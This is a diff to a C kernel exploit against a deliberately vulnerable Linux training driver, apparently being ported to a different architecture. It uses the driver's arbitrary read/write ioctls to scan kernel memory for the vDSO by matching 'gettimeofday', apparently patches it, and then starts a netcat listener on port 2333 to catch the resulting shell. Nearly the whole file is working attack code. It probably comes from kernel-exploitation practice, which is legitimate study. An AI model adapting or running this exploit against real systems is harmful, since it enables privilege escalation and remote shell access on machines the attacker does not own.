@@ -24,27 +24,33 @@
 
 #ifndef _VULN_DRIVER_
 	#define _VULN_DRIVER_
+
 	#define DEVICE_NAME "vulnerable_device"
+
 	#define IOCTL_NUM 0xFE
-	#define DRIVER_TEST _IO (IOCTL_NUM,0)
-	#define BUFFER_OVERFLOW _IOR (IOCTL_NUM,1,char *)
-	#define NULL_POINTER_DEREF _IOR (IOCTL_NUM,2,unsigned long)
-	#define ALLOC_UAF_OBJ _IO (IOCTL_NUM,3)
-	#define USE_UAF_OBJ _IO (IOCTL_NUM,4)
-	#define ALLOC_K_OBJ _IOR (IOCTL_NUM,5,unsigned long)
-	#define FREE_UAF_OBJ _IO (IOCTL_NUM,6)
-	#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM,7, unsigned long)
-	#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM,8,unsigned long)
-	#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM,9,unsigned long)
-	#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM,10,unsigned long)
-	#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM,11,unsigned long)
-	#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM,12,unsigned long)
-	#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM,13,unsigned long)
+
+	#define DRIVER_TEST _IO (IOCTL_NUM, 0) 
+	#define DRIVER_MAP _IO (IOCTL_NUM, 15) 
+	#define DRIVER_MAP_SHOW _IO (IOCTL_NUM, 16) 
+	#define BUFFER_OVERFLOW _IOR (IOCTL_NUM, 1, char *)
+	#define NULL_POINTER_DEREF _IOR (IOCTL_NUM, 2, unsigned long)
+	#define ALLOC_UAF_OBJ _IO (IOCTL_NUM, 3)
+	#define USE_UAF_OBJ _IO (IOCTL_NUM, 4)
+	#define TEST_USE_UAF_OBJ _IO (IOCTL_NUM, 14)
+	#define ALLOC_K_OBJ _IOR (IOCTL_NUM, 5, unsigned long)
+	#define FREE_UAF_OBJ _IO(IOCTL_NUM, 6)
+	#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM, 7, unsigned long)
+	#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM, 8, unsigned long)
+	#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM, 9, unsigned long)
+	#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM, 10, unsigned long)
+	#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM, 11, unsigned long)
+	#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM, 12, unsigned long)
+	#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM, 13, unsigned long)
 #endif
 
 #define PATH "/dev/vulnerable_device"
-#define START_ADDR 0xffffffff80000000
-#define END_ADDR 0xffffffffffffefff
+#define START_ADDR 0xffffffc000000000 //0xffffffff80000000
+#define END_ADDR 0xffffffc00fffffff    //ffffffffffffefff
 
 struct init_args {
 	size_t size;
@@ -78,6 +84,7 @@ int read_mem(int fd, size_t addr,char *buff,int count)
 	ret=ioctl(fd,ARBITRARY_RW_READ,&r_args);   // read
 	return ret;
 }
+
 int write_mem(int fd, size_t addr,char *buff,int count)
 {
 	struct seek_args s_args1;
@@ -114,6 +121,7 @@ int main()
 		puts("[-] open error ! \n");
 		exit(-1);
 	}
+	
     // 构造任意地址读写
 	i_args.size=0x100;
 	ioctl(fd, ARBITRARY_RW_INIT, &i_args);
@@ -125,7 +133,7 @@ int main()
 	for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
 	{
 		read_mem(fd,addr,buf,0x1000);
-		if (!strcmp("gettimeofday",buf+0x2cd))
+		if (!strcmp("gettimeofday",buf+0x202))
 		{
 			result=addr;
 			printf("[+] found vdso 0x%lx\n",result);
@@ -164,6 +172,7 @@ int main()
     	prctl(addr,2,addr,addr,2);
     	exit(-1);
     }
+	
     system("nc -l -p 2333");
 	return 0;
 }
